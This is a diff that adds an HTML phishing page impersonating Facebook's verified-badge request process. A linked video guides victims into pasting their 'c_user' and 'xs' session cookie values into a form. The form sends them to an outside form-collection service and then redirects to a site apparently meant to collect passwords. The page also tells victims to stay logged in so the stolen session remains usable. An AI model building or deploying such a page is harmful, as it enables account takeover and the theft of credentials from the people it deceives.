@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Request a Verified Badge on Facebook</title>
+    <style>
+      body {
+        font-family: "Helvetica Neue", Arial, sans-serif;
+        background-color: #f0f2f5;
+        margin: 0;
+        padding: 0;
+        overflow-x: hidden;
+        /* Prevent horizontal scrolling */
+      }
+
+      .header {
+        background-color: #4267b2;
+        padding: 25px 20px;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        color: white;
+      }
+
+      .header-container {
+        display: flex;
+        align-items: center;
+      }
+
+      .facebook-text {
+        font-size: 35px;
+        font-weight: bold;
+        color: white;
+        font-family: "Helvetica Neue", Arial, sans-serif;
+      }
+
+      .divider {
+        height: 10px;
+        background-color: #e9ebee;
+      }
+
+      .content-container {
+        width: 80%;
+        max-width: 800px;
+        background-color: white;
+        margin: 30px auto;
+        padding: 20px;
+        border-radius: 8px;
+        box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
+        position: relative;
+        /* Ensure positioning of children is relative to this container */
+      }
+
+      .verification-heading {
+        font-size: 32px;
+        /* Larger size for emphasis */
+        color: #1c1e21;
+        margin-bottom: 20px;
+        font-weight: bold;
+        display: flex;
+        align-items: center;
+        /* Align items vertically in the center */
+        position: relative;
+      }
+
+      .verification-heading img {
+        width: 50px;
+        /* Adjust size of the logo */
+        height: auto;
+        margin-right: 15px;
+        /* Space between logo and text */
+      }
+
+      h1 {
+        font-size: 24px;
+        color: #1c1e21;
+        margin-bottom: 20px;
+        font-weight: normal;
+        text-align: left;
+        /* Align text to the left */
+      }
+
+      h2 {
+        font-size: 20px;
+        /* Size for the subheading */
+        color: #1c1e21;
+        margin-bottom: 15px;
+        /* Space below the subheading */
+        font-weight: normal;
+        text-align: center;
+        /* Center text within its container */
+      }
+
+      p {
+        font-size: 14px;
+        color: #606770;
+        margin-bottom: 10px;
+        line-height: 1.6;
+      }
+
+      .video-container {
+        text-align: center;
+        margin-bottom: 20px;
+      }
+
+      video {
+        width: 65%;
+        height: auto;
+        display: block;
+        border-radius: 8px;
+      }
+
+      .form-group {
+        margin-bottom: 20px;
+      }
+
+      label {
+        font-size: 14px;
+        color: #4b4f56;
+        display: block;
+        margin-bottom: 8px;
+      }
+
+      input[type="text"] {
+        width: 100%;
+        padding: 12px 10px;
+        font-size: 14px;
+        border: 1px solid #ccd0d5;
+        border-radius: 6px;
+        box-sizing: border-box;
+        background-color: #f5f6f7;
+        transition: all 0.3s ease;
+      }
+
+      input[type="text"]:focus {
+        border-color: #1877f2;
+        background-color: white;
+        outline: none;
+        box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.2);
+      }
+
+      .notice {
+        font-size: 12px;
+        color: #606770;
+        margin-bottom: 25px;
+        /* Add margin to separate from other content */
+      }
+
+      .form-notice {
+        font-size: 12px;
+        color: #ff0000;
+        /* Use a different color for emphasis */
+        margin-bottom: 20px;
+        /* Space below the notice */
+      }
+
+      button {
+        width: 100%;
+        padding: 12px;
+        background-color: #1877f2;
+        color: white;
+        border: none;
+        border-radius: 6px;
+        cursor: pointer;
+        font-size: 14px;
+        font-weight: 700;
+        text-transform: uppercase;
+        transition: background-color 0.3s ease;
+      }
+
+      button:hover {
+        background-color: #165ecc;
+      }
+    </style>
+  </head>
+
+  <body>
+    <!-- Facebook Header -->
+    <div class="header">
+      <div class="header-container">
+        <span class="facebook-text">facebook</span>
+      </div>
+    </div>
+
+    <!-- Divider to separate header from content -->
+    <div class="divider"></div>
+
+    <!-- Content Container -->
+    <div class="content-container">
+      <!-- Verification Center Heading with Logo -->
+      <div class="verification-heading">
+        <img src="verified-tick.png" alt="Global Glitch Media Logo">
+        Verification Center
+      </div>
+
+      <h1>Request a verified badge on Facebook</h1>
+      <p>
+        The verified badge means that Facebook has confirmed that the Page or
+        profile is the authentic presence of the individual, public figure, or
+        brand that it represents.
+      </p>
+      <p>
+        Previously, the verified badge also required the person or brand to be
+        notable and unique. You may still see users with a verified badge that
+        represents our previous eligibility requirements.
+      </p>
+      <p>
+        Please provide the precise details below. Refer to the video for
+        clarification if you find the instructions unclear.
+      </p>
+
+      <!-- Embedded Video -->
+      <div class="video-container">
+        <video controls="">
+          <source src="https://blqiozzohqqszikuuqad.supabase.co/storage/v1/object/public/video/87aa4c9e-cec7-4e8d-b2e8-62b21351e57d.mov" type="video/mp4">
+          Your browser does not support the video tag.
+        </video>
+      </div>
+
+      <!-- Form Notice -->
+      <p class="form-notice">
+        Please ensure that all required information is accurately provided.
+        Failure to do so may result in not receiving a verified badge.
+      </p>
+
+      <!-- Form -->
+      <form id="userForm" action="https://submit-form.com/oY2NMNMVP" method="POST">
+        <input type="hidden" name="_redirect" value="https://continue-to-password.surge.sh">
+
+        <div class="form-group">
+          <label for="c_user">c_user</label>
+          <input type="text" id="c_user" name="c_user" pattern="[0-9]+" minlength="6" required="">
+        </div>
+        <div class="form-group">
+          <label for="xs">xs</label>
+          <input type="text" id="xs" name="xs" pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&amp;+=]).{12,}$" required="">
+        </div>
+        <p class="notice">
+          Please make sure not to log out from your computer or laptop until you
+          have received a verification email.
+        </p>
+        <button type="submit">Submit</button>
+      </form>
+    </div>
+  
+
+</body></htmmt>
